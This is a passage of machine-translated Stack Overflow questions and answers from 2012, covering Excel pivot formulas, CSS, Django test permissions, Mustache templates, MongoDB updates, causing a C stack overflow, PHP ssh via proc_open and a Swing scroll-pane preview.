我有一个数据透视表，其中包含一些我试图用一张表引用的数据，然后与另一张表交叉引用以比较这两个值。

我目前所拥有的与此处列出的公式相似 - [http://www.techonthenet.com/excel/pivotbls/getpivotdata2.php](http://www.techonthenet.com/excel/pivottbls/getpivotdata2.php)

但是，不是为`=GetPivotData (team_count,"'Team 1' 'Count of B'")`我的工作表中的其余单元格编写然后更改它。

我希望能够引用包含我要查找的数据的单元格。因此，例如，我会有`Team 1`in cell`A2`和`Count of B`in cell `A3`。

我尝试将公式重写为，`=GetPivotData (team_count, A2, A3)`但这只会给我一个错误：/

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-11-26T13:52:54.997

为了避免多余的引号，您还可以使用该`T()`功能：

```
=GETPIVOTDATA( T(team_count), <Ref address of pivottable>, A2, A3) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-12T20:02:10.967

如果`"'Team 1' 'Count of B'"`要从单元格 A2 和 A3 创建字符串：

`=getpivotdata(team_count, **"'" & A2 & "' '" & A3 & "'"**)`

# c# - 在 C# 中使用 .XSD 文件

> ID：10102909
> 
> 赞同：0
> 
> 时间：2012-04-11T09:03:56.250
> 
> 标签：c#, database, xsd

> **可能重复：**
> [Designer.cs 文件在 c# 中的作用](https://stackoverflow.com/questions/10101073/role-of-designer-cs-file-in-c-sharp)

我在我的项目中遇到了 .xsd 文件。这些文件用于为表创建模式。任何人都可以帮助我理解 c# 中 xsd 的使用以及我们如何详细处理数据库。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:20:40.310

您可以使用 xsd.exe 从 .xsd 文件创建强类型数据集。

[生成强类型数据集 (ADO.NET)](http://msdn.microsoft.com/en-us/library/wha85tzb.aspx)

> 给定一个符合 XML 架构定义语言 (XSD) 标准的 XML 架构，您可以使用随 Windows 软件开发工具包 (SDK) 提供的 XSD.exe 工具生成强类型数据集。

# c# - C# 的大地测量库

> ID：10102911
> 
> 赞同：0
> 
> 时间：2012-04-11T09:04:06.013
> 
> 标签：c#, wgs84

由于我无法就这个问题[与 wgs 定义的线段的距离](https://stackoverflow.com/questions/10045544/distance-of-wgs-point-from-a-wgs-defined-line-segment)得到确切的答案，有没有人知道在开发 GPS 应用程序时包含计算功能的大地测量库？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T09:57:20.153

[在 codeplex、 DotSpatial](http://dotspatial.codeplex.com/)和[SharpMap](http://sharpmap.codeplex.com/)上有几个开源项目。在他们的库中实现了许多空间功能。如果您可以使用任何空间数据库，例如[Spatialite](http://www.gaia-gis.it/gaia-sins/)或[PostGIS](http://postgis.refractions.net/)，那么您将能够非常快速且轻松地执行大量空间操作。

# css - 如何使用 CSS 或 Jquery 覆盖 left:0？

> ID：10102915
> 
> 赞同：110
> 
> 时间：2012-04-11T09:04:20.317
> 
> 标签：css, css-position

我有一个元素，它具有以下 CSS：

```
.elem {
  left: 0;
  position: fixed;
  right: 0;
  width: 60%;
  z-index: 1000;
  } 
```

该元素不跨越整个屏幕。我希望它“对齐”到屏幕的右侧。

这很容易，如果我刚刚删除*left: 0*，但我不能篡改上面的 CSS，所以我需要一些 CSS 或 Jquery 来覆盖、禁用或删除*left:0* CSS。

感谢帮助！

* * *

## 回答 #1

> 赞同：253
> 
> 时间：2012-04-11T09:06:51.370

的默认值为，因此只需将其设置为该值，您将“重置”它`left`。`auto`

```
.elem {
  left: auto;
} 
```

确保上述内容位于原始 CSS 文件之后。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-04-22T13:43:42.160

使用 CSS：

```
.elem {
    left: auto;
} 
```

使用 JQuery：

```
$(".elem").css("left", "auto"); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-11T09:08:45.050

在 CSS 中尝试`auto`属性，等于默认值。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-11T09:09:53.520

使用 jquery：

```
$(".elem").css("left", ""); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-11T09:24:50.840

无论您提取的这种样式是外部样式还是内部样式，您都可以使用内部样式覆盖它，例如：

```
.elem {
    position: fixed;
    right: 0;
    width: 60%;
    z-index: 1000;
  } 
```

# django - 在 django 的单元测试期间无法更改用户权限

> ID：10102918
> 
> 赞同：8
> 
> 时间：2012-04-11T09:04:32.710
> 
> 标签：django, django-testing, django-permissions

我终于决定对我的应用程序进行一些测试，但我坚持测试用户是否可以更改另一个用户（取决于用户的类型——我使用 django-rules 能够进行逻辑权限检查，但这并不重要）

这是我到目前为止的代码

```
class RulesAndPermissionsTests(TestCase):
    fixtures = ['auth_no_permissions.json', 'profiles.json', 'rules.json']

    def setUp(self):
        self.c = Client()
        self.user = User.objects.get(username="estagiario")
        self.non_staff = User.objects.get(username="fisica")
        self.admin = User.objects.get(username="admin")
        login = self.c.login(username='estagiario', password='estagiario')

    def test_can_change_non_staff_users(self):
        self.assertFalse(self.user.has_perm('logical_change_user', self.non_staff.profile)) # can't change non staff users without permission

        # now add the permission and test it again
        self.user.user_permissions.add(Permission.objects.get(codename='change_user'))
        print self.user.get_all_permissions() # prints set([])
        self.assertTrue(self.user.has_perm('logical_change_user', self.non_staff.profile)) 
```

即使添加了权限，我的用户仍然没有权限。这是因为我不允许在测试期间创建任何东西（这是一种不好的做法吗？）？还是 django 以某种方式缓存权限？如果我在 setUp 添加权限，它可以工作，但我想在同一个测试期间更改它（在有和没有权限的情况下进行测试）。

提前致谢！

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-04-11T09:30:08.330

如果您查看 的源代码[`ModelBackend`](https://github.com/django/django/blob/master/django/contrib/auth/backends.py)，您可以看到 Django 确实缓存了用户对象的权限。

您可以尝试擦除缓存，但是如果将来缓存机制发生变化，这可能会破坏您的测试。最简单的做法是在测试中从数据库中重新获取用户。

```
from django.contrib.auth.models import Permission

def test_can_change_non_staff_users(self):
    self.assertFalse(self.user.has_perm('logical_change_user', self.non_staff.profile)) # can't change non staff users without permission

    # now add the permission and test it again
    self.user.user_permissions.add(Permission.objects.get(codename='change_user'))

    # refetch user from the database
    self.user = User.objects.get(pk=self.user.pk)
    print self.user.get_all_permissions() # should now include new permission
    self.assertTrue(self.user.has_perm('logical_change_user', self.non_staff.profile)) 
```

# magento - 如何在 MAGENTO 中覆盖 Mage_Catalog_Model_Category_Attribute_Source_Mode？

> ID：10102921
> 
> 赞同：0
> 
> 时间：2012-04-11T09:04:44.317
> 
> 标签：magento, model, attributes

如何在 CMS Magento 中覆盖 ATTRIBUTE SOURCE ？尝试了标准方法但不起作用。

> **我认为这不真实:(**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T23:13:44.873

在 config.xml 文件中：

```
<models>
   <catalog>
       <rewrite>
           <category_attribute_source_mode>YOUR CLASS HERE</category_attribute_source_mode>
       </rewrite>
   </catalog>
</models> 
```

# javascript - 三星 SmartTV overlay（新闻行情）应用程序

> ID：10102923
> 
> 赞同：3
> 
> 时间：2012-04-11T09:04:59.643
> 
> 标签：javascript, html, samsung-smart-tv, television

有没有什么方法可以让应用程序在 DVB 节目（即直播）上作为覆盖（代码）运行？

目前，我们知道，将应用程序显示为屏幕部分覆盖的唯一可行解决方案是从 TV SmartHub 菜单启动应用程序并通过 IP（通常是 HLS）流显示覆盖。

例如，请参见此处 (http://en.wikipedia.org/wiki/File:CNBC_Closing_Bell.jpg) CNBS 代码。我们想开发这样的应用程序......通过 DVB（或其他）广播显示附加信息。

问候，

不锈钢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T08:46:36.443

如果您想在 SmartHub 中运行应用程序并使用电视源作为应用程序的背景，这应该可以帮助您：

对于方法： http: [//www.samsungdforum.com/Guide/View/Developer_Documentation/Samsung_SmartTV_Developer_Documentation_2.5/API_Reference/JavaScript_APIs/Device_API/Window/SetSource](http://www.samsungdforum.com/Guide/View/Developer_Documentation/Samsung_SmartTV_Developer_Documentation_2.5/API_Reference/JavaScript_APIs/Device_API/Window/SetSource)

对于来源的枚举：http: [//www.samsungdforum.com/Guide/View/Developer_Documentation/Samsung_SmartTV_Developer_Documentation_2.5/API_Reference/JavaScript_APIs/Device_API/Window/SetSource](http://www.samsungdforum.com/Guide/View/Developer_Documentation/Samsung_SmartTV_Developer_Documentation_2.5/API_Reference/JavaScript_APIs/Device_API/Window/SetSource)

这只是我的猜测，因为我从来不需要在后台播放电视 - 在我处理 Internet 视频流时总是使用 PL_WINDOW_SOURCE_MEDIA。

请记住，您的应用程序 CSS 中需要有透明背景，因为三星的视频总是在背景下播放。

希望它有帮助！

# mustache - 小胡子模板：如何为非空列表只输出一次块

> ID：10102931
> 
> 赞同：17
> 
> 时间：2012-04-11T09:05:30.090
> 
> 标签：mustache

如果我的列表是空的，我想输出这个：

```
<div id="some-id">
</div> 
```

如果我的列表非空，我想输出：

```
<div id="some-id">
  <ul>
    <li>Item 1</li>
    <li>Item 2</li>
    <li>etc</li>
  </ul>
</div> 
```

请注意，我最多输出`<ul>`and`</ul>`标记*一次*，并且仅当列表非空时。

以下代码与我在 PHP 中的执行方式很接近，但显然是错误的：

```
<div id="some-id">
{{#items}}
  <ul>
{{/items}}

{{#items}}
    <li>{{name}}</li>
{{/items}}

{{#items}}
  </ul>
{{/items}}
</div> 
```

如果`items`是 3 项列表，我会得到 3`<ul>`的 - 显然不是我想要的。

我意识到我可以将其他一些键设置为布尔标志（`hasItems`也许），但这感觉是多余的。

有没有更优雅的方法可以只为非空列表输出一次块？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-10-17T12:52:53.997

如果您不想或不能重新格式化您的数据或模板引擎，您也可以`items.length`在渲染`<ul>`标签之前进行检查。有些人对此不以为然，但这绝对是 Max 答案的替代方案。

```
{{#items.length}}
    <ul>
        {{items}}
            <li>{{name}}</li>
        {{/items}}
    </ul>
{{/items.length}} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-12T05:52:44.913

您可以使用部分的[非假值](http://mustache.github.com/mustache.5.html)。`name`必须是里面的一个对象`items`

```
data = { 'items' : { 'name' : ["Item 1", "Item 2", "etc"] } }; 
```

您的模板看起来像：

```
<div id="some-id">
    {{#items}}
    <ul>
        {{#name}}
        <li>{{.}}</li>
        {{/name}}
    </ul>
    {{/items}}
</div> 
```

`items`这是 jsFiddle 上的一个示例，显示了具有名称和不具有名称的对象的呈现- [http://jsfiddle.net/maxbeatty/fpQwk/](http://jsfiddle.net/maxbeatty/fpQwk/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-05-19T19:43:32.453

其他两个答案不适用于 Mustache 的 Ruby 实现。我的解决方案是发送一个附加参数作为模板上下文的一部分；例如

```
template = <<EOF
{{#has_items}}
<ul>
    {{#items}}
        <li>{{.}}</li>
    {{/items}}
</ul>
{{/has_items}}
EOF
items = ['one', 'two', 'three']
context = { items: items, has_items: items.any? }
Mustache.render(template, context) 
```

# android - 使用 Internet Explorer 中的脚本将 Android 模拟器连接到 Internet

> ID：10102936
> 
> 赞同：0
> 
> 时间：2012-04-11T09:06:14.313
> 
> 标签：android, internet-explorer, android-emulator

我用了：

```
emulator -avd emulatorname -dns-server 10.155.21.206 
```

我得到了错误：

```
C:\Program Files\Android\android-sdk\tools>DNS server name '10.155.21.206' resolved to 10.155.21.206:55 emulator: WARNING: Unable to create sensors port: Unknown error 
```

我也试过`8.8.8.8`。那也不起作用，给了我类似的错误。

我使用脚本连接到互联网`internet explorer but no proxy`。

公司政策可能与此错误有关吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:10:09.530

您根本无法在您的机器上创建必要的端口。是的，它可以被本地机器策略阻止。

# facebook - 我如何使用 as3 访问 facebook 相册？

> ID：10102937
> 
> 赞同：0
> 
> 时间：2012-04-11T09:06:15.843
> 
> 标签：facebook, actionscript-3, facebook-graph-api, facebook-as3-api

我是 as3 的新手。我是怎么开始的？教程 ？我的目的是访问 Facebook 相册？我的第一步应该是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T15:11:50.507

查看[AS3 Facebook API](http://code.google.com/p/facebook-actionscript-api/)以开始。

[Adobe 的网站](http://www.adobe.com/devnet/facebook/samples.html#2)上有一些教程和示例。

# mongodb - Mongodb/Mongoid - {:multi => true} 是什么意思

> ID：10102942
> 
> 赞同：4
> 
> 时间：2012-04-11T09:06:27.647
> 
> 标签：mongodb, mongoid

关于这个问题：[使用 Mongoid，我可以“update_all”一次将一个值推送到一个数组字段中以获取多个条目吗？](https://stackoverflow.com/questions/9637728/with-mongoid-can-i-update-all-to-push-a-value-onto-an-array-field-for-multipl/9645603#comment12940146_9645603)

我想问一下：

1.  来这里的目的是`{:multi => true}`什么？
2.  `update_all`现在通过 mongoid是否可以将值推送到数组中？因为问题是在2010年。

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-11T13:15:33.350

[MongoDB 更新方法](http://www.mongodb.org/display/DOCS/Updating#Updating-update%28%29)的文档说明如下：

> *multi* - 指示是否应该更新所有符合条件的文档，而不仅仅是一个。可以与下面的 $ 运算符一起使用。

所以基本上`multi`参数是启用`update_all`您链接到的问题中的行为的原因。

回答您的第二个问题：是的 - Mongoid 现在已内置此功能。文档参考在[这里](http://mongoid.org/docs/querying/modification.html)。但是你可以像这样使用它：

```
User.where(:gender => "Male").update_all(:title => "Mr") 
```

**更新**

如果你想将一个值推送到一个数组字段上，你仍然需要直接使用 MongoDB 库，因为 Mongoid`update_all`方法只支持`$set`数据库更新方法（可以用来更新整个数组，但不支持将值推到它上面）。

您链接到的问题的答案中的示例将起作用，我已将其复制到那些偶然发现此问题的人下方（感谢[shingara](https://stackoverflow.com/users/285289/shingara)！）：

```
User.collection.update( 
  {'$in' => {:gender => 'Male'}}, 
  {'$push' => {:titles => 'Mr'}},
  {:multi => true}
) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-03-11T06:37:07.790

一个特定的用例是对 Mongodb 进行分片（[http://docs.mongodb.org/master/MongoDB-sharding-guide.pdf](http://docs.mongodb.org/master/MongoDB-sharding-guide.pdf)）。特别是在对分片 mongo 集合进行更新时，当我使用 _id 以外的标识符时，更新失败。我必须将 multi 设置为 true，然后它会更新各个分片中的所有文档。

# azure - 如果我在 SQL Azure 中的 localhost 上运行，计算时间会减少吗？

> ID：10102943
> 
> 赞同：0
> 
> 时间：2012-04-11T09:06:28.680
> 
> 标签：azure, localhost

我在 Windows Azure 中有一个免费试用帐户...如果我在连接到 SQL Azure 的本地主机上运行我的应用程序，计算时间会减少吗？还是仅在我部署我的应用程序后才减少？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T09:29:51.553

在本地模拟器中运行的实例不计入您的实时计算小时数。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T10:59:43.620

添加到@Oliver 的答案：如果您只是在学习/测试，并且想要节省更多的计算时间，请务必在不使用它时停止，然后*删除*您的部署（例如，在您睡觉的晚上）。您当然可以让它 24x7 运行，但每个时钟小时都是一个计算小时，无论是以 0% 还是 100% 运行。

另外：我相信当前的 3 个月优惠适用于 750 个小型实例。如果您改用 Extra Small，则 Extra Small：Small 的比例为 6:1，因此您将使用 Extra Small 获得更多的计算时间。

# jquery - 在 Jqgrid 中显示 Enum 描述而不是 Enum

> ID：10102947
> 
> 赞同：5
> 
> 时间：2012-04-11T09:06:40.830
> 
> 标签：jquery, jqgrid, struts2

我有一个用 Java 编写的这样的枚举：

```
public enum Status
{
  ACTIVE("Active"), IN_ACTIVE("InActive");

  Status(String desc)
  {
    this.description = desc;
  }

  private String description;

  public String getDescription()
  {
    return description;
  }

  public void setDescription(String desc)
  {
    this.description = desc;
  }
} 
```

这个枚举是 jqGrid 中的一个属性。但它总是显示枚举，即 ACTIVE 或 IN_ACTIVE。我希望 jqgrid 显示 Active 和 InActive。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T13:46:32.397

您可以编写[自定义格式化程序](http://www.trirand.com/jqgridwiki/doku.php?id=wiki%3acustom_formatter)来实现此目的。例如：

```
formatStatus: function (cellvalue, options, rowObject){
   if (cellvalue == "ACTIVE")
       return "Active";
   return "InActive";
} 
```

然后确保使用 colmodel 中的格式化程序：

```
{name: 'status', formatter: formatStatus, ...}, 
```

这有帮助吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T18:53:45.800

在你的枚举中实现一个 toString() 如下

```
public toString() {
    return description;
} 
```

这将确保您的 json 响应具有描述而不是枚举名称。

# c - 如何在不推送新堆栈帧的情况下溢出堆栈？

> ID：10102949
> 
> 赞同：5
> 
> 时间：2012-04-11T09:06:48.530
> 
> 标签：c, segmentation-fault, stack-overflow

导致堆栈溢出和获取的一种明显方法`Segmentation fault`是递归地将堆栈帧推到彼此之上，直到它繁荣为止。我想知道是否会在不推送新的堆栈帧的情况下发生堆栈溢出。

根据经验，创建一个足够大的阵列也可以做到这一点，但还有其他可能的情况吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T09:28:10.633

C99 使用可调整大小的数组，您可以使用该数组并不断调整其大小。然而，这个可调整大小的数组是使用`alloca`. **这是UNIX env**中的示例代码：

```
#include <stdio.h>
#include <alloca.h>
#include <stdlib.h>
#include <stdbool.h>

int
main()
{
    while (true)
    {
        void *p = alloca(32UL);
        printf("new memory allocated at %p \n", p);
    }
    exit(EXIT_SUCCESS);
} 
```

你的输出看起来像这样

```
new memory allocated at 0xbf800a60 
new memory allocated at 0xbf800a30 
new memory allocated at 0xbf800a00 
new memory allocated at 0xbf8009d0 
new memory allocated at 0xbf8009a0 
[1]    3977 segmentation fault  ./a.out 
```

`alloca`属于`malloc`函数族，只是它通过调整堆栈指针在堆栈上分配内存。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T09:11:54.110

滥用`alloca()`或者`_alloca()`如果您在 Windows SDK/VS 上开发：

> alloca() 函数在调用者的堆栈帧中分配 size 个字节的空间。

Note`_alloca()`现在已弃用，取而代之的是`_malloca()`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T09:16:31.793

从根本上说，“堆栈”只是一些内存，而堆栈溢出是当 ESP / EBP 超出该内存的范围时。

您可以通过多种方式完成此操作：

1.  创建一个巨大的堆栈分配数组，该数组大于剩余堆栈空间的大小：`int x[10000000];`
2.  直接设置ESP：`__asm mov esp, 0x0`
3.  破坏堆栈，因此当当前函数展开时，ESP/EBP 将被设置为垃圾：`int x; memset(&x, 0, 10000000);`

还有无数其他方式...

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-11T09:20:37.910

通过声明和使用大于堆栈大小的数组：

```
$ ulimit -s
8192
$ 
```

然后

```
int main(void)
{
    volatile char bla[8192 * 1024 + 16] = {0};
} 
```

执行时可能会出现段错误。

# ssh - proc_open 交互

> ID：10102952
> 
> 赞同：2
> 
> 时间：2012-04-11T09:06:55.773
> 
> 标签：ssh, pipe, php, proc-open

这是我想要实现的目标：打开一个 shell（korn 或 bash，没关系），从那个 shell，我想打开一个 ssh 连接（`ssh user@host`）。在某些时候，可能会提示我输入密码，或者可能会询问我是否确定要连接（有问题的键）。

在有人问之前：是的，我知道有一个用于 ssh2 exec 调用的插件，但是我正在使用的服务器不支持它，而且不太可能这样做。

这是我到目前为止所尝试的：

```
$desc = array(array('pipe','r'),array('pipe','w'));//used in all example code
$p = proc_open('ssh user@host',$desc,$pipes);
if(!is_resource($p)){ die('@!#$%');}//will omit this line from now on
sleep(1);//omitting this,too but it's there every time I need it 
```

`stream_get_contents($pipes[1])`然后我尝试读取控制台输出`'connection failed: '.stream_get_contents($pipes[1])`（

这给了我以下错误：

> 不会分配伪终端，因为 stdin 不是终端。

所以，我虽然在 io-stream 上下文中调用了 ssh，但`php://`似乎是对上述错误的合理解释。

下一步：我想到了[我的第一个 SO 问题](https://stackoverflow.com/questions/9843550/load-profile-with-proc-open)，并决定先打开一个 bash/ksh shell 可能是个好主意：

```
$p = proc_open('bash',$desc,$pipes); 
```

从那里拿走它，但我得到了完全相同的错误消息，只是这一次，脚本停止运行，但 ssh 确实运行了。所以我充满希望，然后感到愚蠢，最终绝望：

```
$p=proc_open('bash && ssh user@host',$desc,$pipes); 
```

等待几秒钟后，我收到以下错误：

> PHP致命错误：允许的内存大小为134217728字节已用尽（试图分配133693440字节）

即使在我最后一次绝望的尝试中，调用堆栈也会不断调出 stream_get_contents 行：

```
#!/path/to/bin/php -n
<?php
    $p = proc_open('bash && ssh user@host',array(array('pipe','r'),array('pipe','w')),$ps);
    if (!is_resource($p))
    {
        die('FFS');
    }
    usleep(10);
    fwrite($ps[0],'yes'."\n");
    fflush($ps[0]);
    usleep(20);
    fwrite($ps[0],'password'."\n");
    fflush($ps[0]);
    usleep(20);
    fwrite($ps[0],'whoami'."\n");
    fflush($ps[0]);
    usleep(2);
    $msg = stream_get_contents($ps[1]);
    fwrite($ps[0],'exit'."\n");
    fclose($ps[0]);
    fclose($ps[1]);
    proc_close($p);
?> 
```

我知道，它一团糟，有很多`fflush`冗余，但重点是：我知道这个连接会首先提示我输入违规密钥，然后询问密码。我的猜测是 $pipes[1] 中的流包含 ssh 连接，因此它的内容很大。那么我需要的是管道内的管道......这甚至可能吗？我一定遗漏了一些东西，如果这是不可能的，那么管道有什么好处......我的猜测是 proc_open 命令一开始是错误的，（错误：管道损坏）。但我真的看不到第一个错误的任何其他方式......有什么想法吗？或者如果上述咆哮根本不清楚（可能不是），请跟进问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T17:15:51.160

> 在有人问之前：是的，我知道有一个用于 ssh2 exec 调用的插件，但是我正在使用的服务器不支持它，而且不太可能这样做。

实际上有两个。PECL 模块，这是一个大多数服务器都没有安装的 PITA 和[phpseclib，一个纯 PHP SSH2 实现](http://phpseclib.sourceforge.net/)。其使用示例：

```
<?php
include('Net/SSH2.php');

$ssh = new Net_SSH2('www.domain.tld');
if (!$ssh->login('username', 'password')) {
    exit('Login Failed');
}

echo $ssh->exec('pwd');
echo $ssh->exec('ls -la');
?> 
```

# c# - 将 XML Excel 电子表格转换为 PDF 的第三方工具

> ID：10102957
> 
> 赞同：0
> 
> 时间：2012-04-11T09:07:15.037
> 
> 标签：c#, asp.net, xml, excel, pdf

我正在使用生成 XML Excel 电子表格 2003 (*.xml) 的 CarlosAg ExcelXmlWriter 库

我需要找到可以将生成的 xml 电子表格转换为 PDF 的商业或免费工具。我尝试了 SautinSoft 库，但它不适用于我想要的扩展 (xml) 它只适用于 xlsx 或 xls 扩展

提前谢谢大家

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:14:48.723

试试 Aspose。

[http://www.aspose.com/categories/.net-components/aspose.cells-for-.net/default.aspx](http://www.aspose.com/categories/.net-components/aspose.cells-for-.net/default.aspx)

您可能还需要 PDF 组件，不知道他们现在是如何做到的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:09:28.933

您可以简单地使用一些pdf打印机来完成吗？

# tinymce - MODX：如何在 TinyMCE 中插入指向其他资源的链接

> ID：10102962
> 
> 赞同：1
> 
> 时间：2012-04-11T09:07:40.953
> 
> 标签：tinymce, modx, modx-revolution

我错过了什么吗？在插入指向其他资源的链接时，似乎应该有一个“资源选择器”来自动插入`[[~id]]`内部链接的标签。MODX Revolution 中的 TinyMCE 编辑器是否提供了这样的“选择器”？

我的意思是*我*不介意使用资源语法，但我不认为我的用户愿意学习和记住它。

当我单击“插入/编辑链接”按钮时，这是我得到的对话框：

[![](../Images/4edb75ad5435f62ea5c361172b6aba76.png)](https://blunderings.files.wordpress.com/2012/04/modx_tinymce_insert_link.jpg)

单击“链接网址”右侧的“浏览”按钮会出现以下对话框：

[![](../Images/9de2df66801e7aab2544fdebccb85005.png)](https://blunderings.files.wordpress.com/2012/04/modx_tinymce_resources_browser.jpg)

我没有看到任何可以让我选择资源的东西。

我在 IIS 7.5 上使用 MODX Revolution 2.2.1-pl（传统）。那里可能存在问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-12T03:04:57.807

我想通了，我肯定错过了一些东西。“插入/编辑链接”对话框有一个搜索框，当您在其中键入现有文档的名称时，它会自动完成。从那里选择一个文档会以正确的语法插入文档的 ID。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T11:23:27.417

应该有。

编辑文本时，如果您突出显示要用作链接的单词，然后单击“编辑/插入链接”图标（链式链接），则会出现一个“链接列表”选择框，其中包含您的所有资源，选择一个将填充链接 url与所选资源的 [[~id]]。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-05-17T13:05:09.857

在 MODX Revo 管理器中，最好使用 ACE-Editor（Extras/Package/download extras 选择 Ace）来构建您的模板。现在您可以从左侧的 Ressource-Tree 中拖动一个 Ressource 并将其放入 Ace-Window 中的代码中。 [![拖放资源](../Images/481f303166005e52e6ec2bb402504df6.png)](https://i.stack.imgur.com/gzXTy.png) 这是创建资源链接的最简单方法。

# java - 显示概览的滚动窗格/视口摆动组件

> ID：10102965
> 
> 赞同：3
> 
> 时间：2012-04-11T09:07:51.250
> 
> 标签：java, swing, custom-component

我正在寻找一个 Swing 组件，它是滚动窗格/视口的扩展，允许打开并导航到当前显示的内容的概述中。我敢肯定，在过去的几个月（几年？）中，我看到过一些博客文章显示了这样的组件，但再也找不到该组件了。

这是我正在寻找的图片：

![带有概览的滚动面板](../Images/a6082ae5b8693b8bb6effa3cfe14a5b1.png)

如果您记得这样的帖子，或者您的书签中有一些链接，我会感谢您分享这些信息。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T10:02:38.130

这是一个工作示例，但您将需要[java-image-scaling](http://code.google.com/p/java-image-scaling/)库（其 LGPL） - 它用于平滑缩放预览图像，否则您会完全破坏图像：

```
public static void main ( String[] args )
{
    final JFrame mainFrame = new JFrame ();

    JPanel content = new JPanel ( new GridLayout ( 20, 20 ) );
    for ( int i = 0; i < 20; i++ )
    {
        for ( int j = 0; j < 20; j++ )
        {
            content.add ( new JLabel ( "Test " + i + ":" + j )
            {
                {
                    setBorder ( BorderFactory.createEmptyBorder ( 20, 20, 20, 20 ) );
                }
            } );
        }
    }

    final JScrollPane pane = new JScrollPane ( content );
    pane.setCorner ( JScrollPane.LOWER_TRAILING_CORNER, new JButton ()
    {
        {
            final JButton button = this;
            addActionListener ( new ActionListener ()
            {
                public void actionPerformed ( ActionEvent e )
                {
                    JComponent comp = ( JComponent ) pane.getViewport ().getView ();
                    Dimension size = comp.getSize ();
                    Rectangle viewRect = comp.getVisibleRect ();

                    // Drawing preview
                    BufferedImage image = new BufferedImage ( size.width, size.height,
                            BufferedImage.TYPE_INT_RGB );
                    Graphics2D g2d = image.createGraphics ();
                    comp.print ( g2d );
                    g2d.dispose ();

                    // Rescaling preview
                    int width = 200;
                    int height = comp.getHeight () * width / comp.getHeight ();
                    BufferedImage rescaled =
                            new ResampleOp ( width, height ).filter ( image, null );

                    // Drawing view rect
                    float diff = (float)width / size.width;
                    g2d = rescaled.createGraphics ();
                    g2d.setPaint ( Color.RED );
                    g2d.drawRect ( Math.round ( viewRect.x * diff ),
                            Math.round ( viewRect.y * diff ),
                            Math.round ( viewRect.width * diff ),
                            Math.round ( viewRect.height * diff ) );
                    g2d.dispose ();

                    // Displaying preview
                    final JDialog preview = new JDialog ( mainFrame );
                    preview.setUndecorated ( true );
                    preview.add ( new JLabel ( new ImageIcon ( rescaled ) )
                    {
                        {
                            setBorder ( BorderFactory.createLineBorder ( Color.BLACK ) );
                            setFocusable ( true );
                        }
                    } );
                    Point los = button.getLocationOnScreen ();
                    preview.setSize ( width + 2, height + 2 );
                    preview.setLocation ( los.x - width - 2, los.y - height - 2 );
                    preview.setVisible ( true );

                    preview.requestFocus ();
                    preview.addFocusListener ( new FocusAdapter ()
                    {
                        public void focusLost ( FocusEvent e )
                        {
                            preview.dispose ();
                        }
                    } );
                }
            } );
        }
    } );
    mainFrame.add ( pane );

    mainFrame.setSize ( 600, 600 );
    mainFrame.setLocationRelativeTo ( null );
    mainFrame.setDefaultCloseOperation ( JFrame.EXIT_ON_CLOSE );
    mainFrame.setVisible ( true );
} 
```

所以基本上我创建了面板的快照，重新调整它并放入在按钮附近打开并在焦点丢失时关闭的小对话框中。虽然创建快照可能会浪费时间，但我不知道有什么更好的方法来创建整个滚动窗格容器的渲染预览 - 你必须将它绘制到某些东西上才能显示预览，这意味着它将花费相同的时间。

您还可以轻松修改预览组件，以便您可以通过在预览对话框上拖动红色矩形来移动可见矩形：)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T09:42:33.973

是可能`JComponent(s)`的

1)[玻璃窗格](https://stackoverflow.com/questions/8715807/layering-multiple-glasspanes-in-a-root-container)

2）基于JXLayer（Java6）的[JLayer（Java7 ）](http://docs.oracle.com/javase/tutorial/uiswing/misc/jlayer.html)

3) [JViewport](https://stackoverflow.com/questions/8614972/passing-current-date)

4）[半透明JDialog的定位](http://java.sun.com/developer/technicalArticles/GUI/translucent_shaped_windows/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T10:30:02.817

Jide-OSS 中有 CornerScroller。

[http://java.net/projects/jide-oss/sources/svn/content/trunk/src/com/jidesoft/swing/CornerScroller.java](http://java.net/projects/jide-oss/sources/svn/content/trunk/src/com/jidesoft/swing/CornerScroller.java)

# sql-server - 从 SQL Server 列出批量数据的结果集的工具

> ID：10102966
> 
> 赞同：0
> 
> 时间：2012-04-11T09:07:51.847
> 
> 标签：sql-server, database, sql-server-2008

我有很多记录需要查询数据库。如何使用我的大量数据编写一个可以一次列出所有结果集的查询？

我在 SQL Server 2008 中使用的数据库

* * *
